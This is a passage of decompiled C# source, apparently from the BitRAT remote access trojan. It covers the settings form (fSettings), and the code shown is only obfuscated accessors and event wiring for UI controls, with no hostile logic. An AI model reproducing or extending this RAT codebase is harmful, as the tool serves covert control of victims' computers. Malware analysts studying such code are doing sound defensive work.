﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BitRAT.My;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x020000EF RID: 239
[DesignerGenerated]
public sealed partial class fSettings : Form
{
	// Token: 0x06000BAA RID: 2986 RVA: 0x0000763A File Offset: 0x0000583A
	public fSettings()
	{
		base.Load += this.fSettings_Load;
		base.Closing += this.fSettings_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06000BAD RID: 2989 RVA: 0x0000766C File Offset: 0x0000586C
	internal Button vmethod_0()
	{
		return this.button_0;
	}

	// Token: 0x06000BAE RID: 2990 RVA: 0x00007674 File Offset: 0x00005874
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(Button button_2)
	{
		this.button_0 = button_2;
	}

	// Token: 0x06000BAF RID: 2991 RVA: 0x0000767D File Offset: 0x0000587D
	internal Button vmethod_2()
	{
		return this.button_1;
	}

	// Token: 0x06000BB0 RID: 2992 RVA: 0x00007685 File Offset: 0x00005885
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(Button button_2)
	{
		this.button_1 = button_2;
	}

	// Token: 0x06000BB1 RID: 2993 RVA: 0x0000768E File Offset: 0x0000588E
	internal Splitter vmethod_4()
	{
		return this.splitter_0;
	}

	// Token: 0x06000BB2 RID: 2994 RVA: 0x00007696 File Offset: 0x00005896
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(Splitter splitter_1)
	{
		this.splitter_0 = splitter_1;
	}

	// Token: 0x06000BB3 RID: 2995 RVA: 0x0000769F File Offset: 0x0000589F
	internal TabControl vmethod_6()
	{
		return this.tabControl_0;
	}

	// Token: 0x06000BB4 RID: 2996 RVA: 0x000076A7 File Offset: 0x000058A7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(TabControl tabControl_1)
	{
		this.tabControl_0 = tabControl_1;
	}

	// Token: 0x06000BB5 RID: 2997 RVA: 0x000076B0 File Offset: 0x000058B0
	internal TabPage vmethod_8()
	{
		return this.tabPage_0;
	}

	// Token: 0x06000BB6 RID: 2998 RVA: 0x000076B8 File Offset: 0x000058B8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(TabPage tabPage_7)
	{
		this.tabPage_0 = tabPage_7;
	}

	// Token: 0x06000BB7 RID: 2999 RVA: 0x000076C1 File Offset: 0x000058C1
	internal Label vmethod_10()
	{
		return this.label_0;
	}

	// Token: 0x06000BB8 RID: 3000 RVA: 0x000076C9 File Offset: 0x000058C9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(Label label_40)
	{
		this.label_0 = label_40;
	}

	// Token: 0x06000BB9 RID: 3001 RVA: 0x000076D2 File Offset: 0x000058D2
	internal Label vmethod_12()
	{
		return this.label_1;
	}

	// Token: 0x06000BBA RID: 3002 RVA: 0x000076DA File Offset: 0x000058DA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(Label label_40)
	{
		this.label_1 = label_40;
	}

	// Token: 0x06000BBB RID: 3003 RVA: 0x000076E3 File Offset: 0x000058E3
	internal TextBox vmethod_14()
	{
		return this.textBox_0;
	}

	// Token: 0x06000BBC RID: 3004 RVA: 0x000076EB File Offset: 0x000058EB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(TextBox textBox_20)
	{
		this.textBox_0 = textBox_20;
	}

	// Token: 0x06000BBD RID: 3005 RVA: 0x000076F4 File Offset: 0x000058F4
	internal CheckBox vmethod_16()
	{
		return this.checkBox_0;
	}

	// Token: 0x06000BBE RID: 3006 RVA: 0x0006159C File Offset: 0x0005F79C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(CheckBox checkBox_18)
	{
		EventHandler value = new EventHandler(this.method_57);
		CheckBox checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_0 = checkBox_18;
		checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000BBF RID: 3007 RVA: 0x000076FC File Offset: 0x000058FC
	internal TextBox vmethod_18()
	{
		return this.textBox_1;
	}

	// Token: 0x06000BC0 RID: 3008 RVA: 0x000615E0 File Offset: 0x0005F7E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_6);
		TextBox textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_1 = textBox_20;
		textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000BC1 RID: 3009 RVA: 0x00007704 File Offset: 0x00005904
	internal Label vmethod_20()
	{
		return this.label_2;
	}

	// Token: 0x06000BC2 RID: 3010 RVA: 0x0000770C File Offset: 0x0000590C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(Label label_40)
	{
		this.label_2 = label_40;
	}

	// Token: 0x06000BC3 RID: 3011 RVA: 0x00007715 File Offset: 0x00005915
	internal TextBox vmethod_22()
	{
		return this.textBox_2;
	}

	// Token: 0x06000BC4 RID: 3012 RVA: 0x00061624 File Offset: 0x0005F824
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_34);
		TextBox textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_2 = textBox_20;
		textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000BC5 RID: 3013 RVA: 0x0000771D File Offset: 0x0000591D
	internal Label vmethod_24()
	{
		return this.label_3;
	}

	// Token: 0x06000BC6 RID: 3014 RVA: 0x00007725 File Offset: 0x00005925
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(Label label_40)
	{
		this.label_3 = label_40;
	}

	// Token: 0x06000BC7 RID: 3015 RVA: 0x0000772E File Offset: 0x0000592E
	internal TabPage vmethod_26()
	{
		return this.tabPage_1;
	}

	// Token: 0x06000BC8 RID: 3016 RVA: 0x00007736 File Offset: 0x00005936
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(TabPage tabPage_7)
	{
		this.tabPage_1 = tabPage_7;
	}

	// Token: 0x06000BC9 RID: 3017 RVA: 0x0000773F File Offset: 0x0000593F
	internal TextBox vmethod_28()
	{
		return this.textBox_3;
	}

	// Token: 0x06000BCA RID: 3018 RVA: 0x00061668 File Offset: 0x0005F868
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_4);
		TextBox textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_3 = textBox_20;
		textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000BCB RID: 3019 RVA: 0x00007747 File Offset: 0x00005947
	internal Label vmethod_30()
	{
		return this.label_4;
	}

	// Token: 0x06000BCC RID: 3020 RVA: 0x0000774F File Offset: 0x0000594F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(Label label_40)
	{
		this.label_4 = label_40;
	}

	// Token: 0x06000BCD RID: 3021 RVA: 0x00007758 File Offset: 0x00005958
	internal Label vmethod_32()
	{
		return this.label_5;
	}

	// Token: 0x06000BCE RID: 3022 RVA: 0x00007760 File Offset: 0x00005960
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(Label label_40)
	{
		this.label_5 = label_40;
	}

	// Token: 0x06000BCF RID: 3023 RVA: 0x00007769 File Offset: 0x00005969
	internal PictureBox vmethod_34()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000BD0 RID: 3024 RVA: 0x000616AC File Offset: 0x0005F8AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_13);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_16;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000BD1 RID: 3025 RVA: 0x00007771 File Offset: 0x00005971
	internal TabPage vmethod_36()
	{
		return this.tabPage_2;
	}

	// Token: 0x06000BD2 RID: 3026 RVA: 0x00007779 File Offset: 0x00005979
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(TabPage tabPage_7)
	{
		this.tabPage_2 = tabPage_7;
	}

	// Token: 0x06000BD3 RID: 3027 RVA: 0x00007782 File Offset: 0x00005982
	internal Label vmethod_38()
	{
		return this.label_6;
	}

	// Token: 0x06000BD4 RID: 3028 RVA: 0x0000778A File Offset: 0x0000598A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(Label label_40)
	{
		this.label_6 = label_40;
	}

	// Token: 0x06000BD5 RID: 3029 RVA: 0x00007793 File Offset: 0x00005993
	internal Label vmethod_40()
	{
		return this.label_7;
	}

	// Token: 0x06000BD6 RID: 3030 RVA: 0x0000779B File Offset: 0x0000599B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(Label label_40)
	{
		this.label_7 = label_40;
	}

	// Token: 0x06000BD7 RID: 3031 RVA: 0x000077A4 File Offset: 0x000059A4
	internal TextBox vmethod_42()
	{
		return this.textBox_4;
	}

	// Token: 0x06000BD8 RID: 3032 RVA: 0x000616F0 File Offset: 0x0005F8F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_7);
		EventHandler value2 = new EventHandler(this.method_8);
		EventHandler value3 = new EventHandler(this.method_12);
		TextBox textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_4 = textBox_20;
		textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000BD9 RID: 3033 RVA: 0x000077AC File Offset: 0x000059AC
	internal TextBox vmethod_44()
	{
		return this.textBox_5;
	}

	// Token: 0x06000BDA RID: 3034 RVA: 0x0006176C File Offset: 0x0005F96C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_9);
		EventHandler value2 = new EventHandler(this.method_10);
		EventHandler value3 = new EventHandler(this.method_11);
		TextBox textBox = this.textBox_5;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_5 = textBox_20;
		textBox = this.textBox_5;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000BDB RID: 3035 RVA: 0x000077B4 File Offset: 0x000059B4
	internal Label vmethod_46()
	{
		return this.label_8;
	}

	// Token: 0x06000BDC RID: 3036 RVA: 0x000077BC File Offset: 0x000059BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(Label label_40)
	{
		this.label_8 = label_40;
	}

	// Token: 0x06000BDD RID: 3037 RVA: 0x000077C5 File Offset: 0x000059C5
	internal PictureBox vmethod_48()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06000BDE RID: 3038 RVA: 0x000617E8 File Offset: 0x0005F9E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_14);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_16;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000BDF RID: 3039 RVA: 0x000077CD File Offset: 0x000059CD
	internal Label vmethod_50()
	{
		return this.label_9;
	}

	// Token: 0x06000BE0 RID: 3040 RVA: 0x000077D5 File Offset: 0x000059D5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(Label label_40)
	{
		this.label_9 = label_40;
	}

	// Token: 0x06000BE1 RID: 3041 RVA: 0x000077DE File Offset: 0x000059DE
	internal TextBox vmethod_52()
	{
		return this.textBox_6;
	}

	// Token: 0x06000BE2 RID: 3042 RVA: 0x0006182C File Offset: 0x0005FA2C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_5);
		TextBox textBox = this.textBox_6;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_6 = textBox_20;
		textBox = this.textBox_6;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000BE3 RID: 3043 RVA: 0x000077E6 File Offset: 0x000059E6
	internal Label vmethod_54()
	{
		return this.label_10;
	}

	// Token: 0x06000BE4 RID: 3044 RVA: 0x000077EE File Offset: 0x000059EE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(Label label_40)
	{
		this.label_10 = label_40;
	}

	// Token: 0x06000BE5 RID: 3045 RVA: 0x000077F7 File Offset: 0x000059F7
	internal TabPage vmethod_56()
	{
		return this.tabPage_3;
	}

	// Token: 0x06000BE6 RID: 3046 RVA: 0x000077FF File Offset: 0x000059FF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(TabPage tabPage_7)
	{
		this.tabPage_3 = tabPage_7;
	}

	// Token: 0x06000BE7 RID: 3047 RVA: 0x00007808 File Offset: 0x00005A08
	internal PictureBox vmethod_58()
	{
		return this.pictureBox_2;
	}

	// Token: 0x06000BE8 RID: 3048 RVA: 0x00061870 File Offset: 0x0005FA70
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_15);
		PictureBox pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_2 = pictureBox_16;
		pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000BE9 RID: 3049 RVA: 0x00007810 File Offset: 0x00005A10
	internal CheckBox vmethod_60()
	{
		return this.checkBox_1;
	}

	// Token: 0x06000BEA RID: 3050 RVA: 0x000618B4 File Offset: 0x0005FAB4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(CheckBox checkBox_18)
	{
		EventHandler value = new EventHandler(this.method_16);
		CheckBox checkBox = this.checkBox_1;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_1 = checkBox_18;
		checkBox = this.checkBox_1;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000BEB RID: 3051 RVA: 0x00007818 File Offset: 0x00005A18
	internal RadioButton vmethod_62()
	{
		return this.radioButton_0;
	}

	// Token: 0x06000BEC RID: 3052 RVA: 0x00007820 File Offset: 0x00005A20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(RadioButton radioButton_4)
	{
		this.radioButton_0 = radioButton_4;
	}

	// Token: 0x06000BED RID: 3053 RVA: 0x00007829 File Offset: 0x00005A29
	internal Label vmethod_64()
	{
		return this.label_11;
	}

	// Token: 0x06000BEE RID: 3054 RVA: 0x00007831 File Offset: 0x00005A31
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(Label label_40)
	{
		this.label_11 = label_40;
	}

	// Token: 0x06000BEF RID: 3055 RVA: 0x0000783A File Offset: 0x00005A3A
	internal RadioButton vmethod_66()
	{
		return this.radioButton_1;
	}

	// Token: 0x06000BF0 RID: 3056 RVA: 0x00007842 File Offset: 0x00005A42
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(RadioButton radioButton_4)
	{
		this.radioButton_1 = radioButton_4;
	}

	// Token: 0x06000BF1 RID: 3057 RVA: 0x0000784B File Offset: 0x00005A4B
	internal Label vmethod_68()
	{
		return this.label_12;
	}

	// Token: 0x06000BF2 RID: 3058 RVA: 0x00007853 File Offset: 0x00005A53
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(Label label_40)
	{
		this.label_12 = label_40;
	}

	// Token: 0x06000BF3 RID: 3059 RVA: 0x0000785C File Offset: 0x00005A5C
	internal Label vmethod_70()
	{
		return this.label_13;
	}

	// Token: 0x06000BF4 RID: 3060 RVA: 0x00007864 File Offset: 0x00005A64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(Label label_40)
	{
		this.label_13 = label_40;
	}

	// Token: 0x06000BF5 RID: 3061 RVA: 0x0000786D File Offset: 0x00005A6D
	internal TrackBar vmethod_72()
	{
		return this.trackBar_0;
	}

	// Token: 0x06000BF6 RID: 3062 RVA: 0x000618F8 File Offset: 0x0005FAF8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(TrackBar trackBar_2)
	{
		EventHandler value = new EventHandler(this.method_17);
		TrackBar trackBar = this.trackBar_0;
		if (trackBar != null)
		{
			trackBar.Scroll -= value;
		}
		this.trackBar_0 = trackBar_2;
		trackBar = this.trackBar_0;
		if (trackBar != null)
		{
			trackBar.Scroll += value;
		}
	}

	// Token: 0x06000BF7 RID: 3063 RVA: 0x00007875 File Offset: 0x00005A75
	internal Label vmethod_74()
	{
		return this.label_14;
	}

	// Token: 0x06000BF8 RID: 3064 RVA: 0x0000787D File Offset: 0x00005A7D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(Label label_40)
	{
		this.label_14 = label_40;
	}

	// Token: 0x06000BF9 RID: 3065 RVA: 0x00007886 File Offset: 0x00005A86
	internal TextBox vmethod_76()
	{
		return this.textBox_7;
	}

	// Token: 0x06000BFA RID: 3066 RVA: 0x0006193C File Offset: 0x0005FB3C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_22);
		TextBox textBox = this.textBox_7;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_7 = textBox_20;
		textBox = this.textBox_7;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000BFB RID: 3067 RVA: 0x0000788E File Offset: 0x00005A8E
	internal Label vmethod_78()
	{
		return this.label_15;
	}

	// Token: 0x06000BFC RID: 3068 RVA: 0x00007896 File Offset: 0x00005A96
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(Label label_40)
	{
		this.label_15 = label_40;
	}

	// Token: 0x06000BFD RID: 3069 RVA: 0x0000789F File Offset: 0x00005A9F
	internal Label vmethod_80()
	{
		return this.label_16;
	}

	// Token: 0x06000BFE RID: 3070 RVA: 0x000078A7 File Offset: 0x00005AA7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(Label label_40)
	{
		this.label_16 = label_40;
	}

	// Token: 0x06000BFF RID: 3071 RVA: 0x000078B0 File Offset: 0x00005AB0
	internal TextBox vmethod_82()
	{
		return this.textBox_8;
	}

	// Token: 0x06000C00 RID: 3072 RVA: 0x00061980 File Offset: 0x0005FB80
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_21);
		TextBox textBox = this.textBox_8;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_8 = textBox_20;
		textBox = this.textBox_8;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C01 RID: 3073 RVA: 0x000078B8 File Offset: 0x00005AB8
	internal Label vmethod_84()
	{
		return this.label_17;
	}

	// Token: 0x06000C02 RID: 3074 RVA: 0x000078C0 File Offset: 0x00005AC0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(Label label_40)
	{
		this.label_17 = label_40;
	}

	// Token: 0x06000C03 RID: 3075 RVA: 0x000078C9 File Offset: 0x00005AC9
	internal TextBox vmethod_86()
	{
		return this.textBox_9;
	}

	// Token: 0x06000C04 RID: 3076 RVA: 0x000619C4 File Offset: 0x0005FBC4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_20);
		TextBox textBox = this.textBox_9;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_9 = textBox_20;
		textBox = this.textBox_9;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C05 RID: 3077 RVA: 0x000078D1 File Offset: 0x00005AD1
	internal Label vmethod_88()
	{
		return this.label_18;
	}

	// Token: 0x06000C06 RID: 3078 RVA: 0x000078D9 File Offset: 0x00005AD9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(Label label_40)
	{
		this.label_18 = label_40;
	}

	// Token: 0x06000C07 RID: 3079 RVA: 0x000078E2 File Offset: 0x00005AE2
	internal Label vmethod_90()
	{
		return this.label_19;
	}

	// Token: 0x06000C08 RID: 3080 RVA: 0x000078EA File Offset: 0x00005AEA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(Label label_40)
	{
		this.label_19 = label_40;
	}

	// Token: 0x06000C09 RID: 3081 RVA: 0x000078F3 File Offset: 0x00005AF3
	internal TextBox vmethod_92()
	{
		return this.textBox_10;
	}

	// Token: 0x06000C0A RID: 3082 RVA: 0x00061A08 File Offset: 0x0005FC08
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_19);
		TextBox textBox = this.textBox_10;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_10 = textBox_20;
		textBox = this.textBox_10;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C0B RID: 3083 RVA: 0x000078FB File Offset: 0x00005AFB
	internal ComboBox vmethod_94()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000C0C RID: 3084 RVA: 0x00007903 File Offset: 0x00005B03
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(ComboBox comboBox_2)
	{
		this.comboBox_0 = comboBox_2;
	}

	// Token: 0x06000C0D RID: 3085 RVA: 0x0000790C File Offset: 0x00005B0C
	internal Label vmethod_96()
	{
		return this.label_20;
	}

	// Token: 0x06000C0E RID: 3086 RVA: 0x00007914 File Offset: 0x00005B14
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(Label label_40)
	{
		this.label_20 = label_40;
	}

	// Token: 0x06000C0F RID: 3087 RVA: 0x0000791D File Offset: 0x00005B1D
	internal ComboBox vmethod_98()
	{
		return this.comboBox_1;
	}

	// Token: 0x06000C10 RID: 3088 RVA: 0x00007925 File Offset: 0x00005B25
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(ComboBox comboBox_2)
	{
		this.comboBox_1 = comboBox_2;
	}

	// Token: 0x06000C11 RID: 3089 RVA: 0x0000792E File Offset: 0x00005B2E
	internal Label vmethod_100()
	{
		return this.label_21;
	}

	// Token: 0x06000C12 RID: 3090 RVA: 0x00007936 File Offset: 0x00005B36
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(Label label_40)
	{
		this.label_21 = label_40;
	}

	// Token: 0x06000C13 RID: 3091 RVA: 0x0000793F File Offset: 0x00005B3F
	internal CheckBox vmethod_102()
	{
		return this.checkBox_2;
	}

	// Token: 0x06000C14 RID: 3092 RVA: 0x00007947 File Offset: 0x00005B47
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(CheckBox checkBox_18)
	{
		this.checkBox_2 = checkBox_18;
	}

	// Token: 0x06000C15 RID: 3093 RVA: 0x00007950 File Offset: 0x00005B50
	internal TrackBar vmethod_104()
	{
		return this.trackBar_1;
	}

	// Token: 0x06000C16 RID: 3094 RVA: 0x00061A4C File Offset: 0x0005FC4C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(TrackBar trackBar_2)
	{
		EventHandler value = new EventHandler(this.method_18);
		TrackBar trackBar = this.trackBar_1;
		if (trackBar != null)
		{
			trackBar.Scroll -= value;
		}
		this.trackBar_1 = trackBar_2;
		trackBar = this.trackBar_1;
		if (trackBar != null)
		{
			trackBar.Scroll += value;
		}
	}

	// Token: 0x06000C17 RID: 3095 RVA: 0x00007958 File Offset: 0x00005B58
	internal Label vmethod_106()
	{
		return this.label_22;
	}

	// Token: 0x06000C18 RID: 3096 RVA: 0x00007960 File Offset: 0x00005B60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(Label label_40)
	{
		this.label_22 = label_40;
	}

	// Token: 0x06000C19 RID: 3097 RVA: 0x00007969 File Offset: 0x00005B69
	internal Label vmethod_108()
	{
		return this.label_23;
	}

	// Token: 0x06000C1A RID: 3098 RVA: 0x00007971 File Offset: 0x00005B71
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(Label label_40)
	{
		this.label_23 = label_40;
	}

	// Token: 0x06000C1B RID: 3099 RVA: 0x0000797A File Offset: 0x00005B7A
	internal CheckBox vmethod_110()
	{
		return this.checkBox_3;
	}

	// Token: 0x06000C1C RID: 3100 RVA: 0x00007982 File Offset: 0x00005B82
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(CheckBox checkBox_18)
	{
		this.checkBox_3 = checkBox_18;
	}

	// Token: 0x06000C1D RID: 3101 RVA: 0x0000798B File Offset: 0x00005B8B
	internal PictureBox vmethod_112()
	{
		return this.pictureBox_3;
	}

	// Token: 0x06000C1E RID: 3102 RVA: 0x00061A90 File Offset: 0x0005FC90
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_23);
		PictureBox pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_3 = pictureBox_16;
		pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C1F RID: 3103 RVA: 0x00007993 File Offset: 0x00005B93
	internal CheckBox vmethod_114()
	{
		return this.checkBox_4;
	}

	// Token: 0x06000C20 RID: 3104 RVA: 0x00061AD4 File Offset: 0x0005FCD4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(CheckBox checkBox_18)
	{
		EventHandler value = new EventHandler(this.method_24);
		CheckBox checkBox = this.checkBox_4;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_4 = checkBox_18;
		checkBox = this.checkBox_4;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000C21 RID: 3105 RVA: 0x0000799B File Offset: 0x00005B9B
	internal PictureBox vmethod_116()
	{
		return this.pictureBox_4;
	}

	// Token: 0x06000C22 RID: 3106 RVA: 0x00061B18 File Offset: 0x0005FD18
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_117(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_25);
		PictureBox pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_4 = pictureBox_16;
		pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000C23 RID: 3107 RVA: 0x000079A3 File Offset: 0x00005BA3
	internal Label vmethod_118()
	{
		return this.label_24;
	}

	// Token: 0x06000C24 RID: 3108 RVA: 0x000079AB File Offset: 0x00005BAB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_119(Label label_40)
	{
		this.label_24 = label_40;
	}

	// Token: 0x06000C25 RID: 3109 RVA: 0x000079B4 File Offset: 0x00005BB4
	internal TextBox vmethod_120()
	{
		return this.textBox_11;
	}

	// Token: 0x06000C26 RID: 3110 RVA: 0x00061B5C File Offset: 0x0005FD5C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_121(TextBox textBox_20)
	{
		EventHandler value = new EventHandler(this.method_27);
		TextBox textBox = this.textBox_11;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_11 = textBox_20;
		textBox = this.textBox_11;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000C27 RID: 3111 RVA: 0x000079BC File Offset: 0x00005BBC
	internal PictureBox vmethod_122()
	{
		return this.pictureBox_5;
	}

	// Token: 0x06000C28 RID: 3112 RVA: 0x00061BA0 File Offset: 0x0005FDA0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_123(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_26);
		PictureBox pictureBox = this.pictureBox_5;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
